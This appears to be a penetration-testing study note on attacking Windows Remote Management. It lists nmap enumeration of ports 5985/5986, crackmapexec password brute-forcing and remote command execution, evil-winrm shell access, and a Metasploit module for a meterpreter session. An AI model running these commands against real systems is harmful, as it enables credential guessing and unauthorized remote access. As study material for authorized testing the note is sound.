requires credentials

Brief
=
- windows remote management protocol
- not configured to run by default
- facilitates remote access over https 5985 5986
- purpose is to make life easier to sys admins to manage a larger number of machines
- can run over the internet

Methodology
=
1. use nmap to scan for winrm ports - not in the top ports, specify ports (5985, 5986 or port range or all ports). service scan on nmap will not explicity say it is winrm service, will display http information
2. use crackmapexec to bruteforce winrm
3. use crackmapexec to execute commands (whoami, systeminfo)
4. use evil-winrm to get shell on system or metasploit winrm-script_exec module for meterpreter session

Authentication
=
1. user/pass authentication
2. user/password hash authentication

Enumeration
=
`nmap -sV ip -p5985,5986`

crackmapexec
=
brute force WinRM to get users and passwords and execute commands on system

supports protocols: mssql, smb, winrm, ssh

bruteforce usage (winrm):
`crackmapexec winrm target_ip -u username.lst/username -p password.lst`

execute commands usage (winrm):
`crackmapexec winrm -u user -p password -x "command"`

evil-winrm
=
ruby script to obtain command shell session on target system

usage for command shell:
`evil-winrm.rb -u username -p password -i target_ip`

Metasploit
=
`use exploit/windows/winrm/winrm_scrip_exec` meterpreter shell (might not work, may need to keep retrying to module)
	set force_vbs true
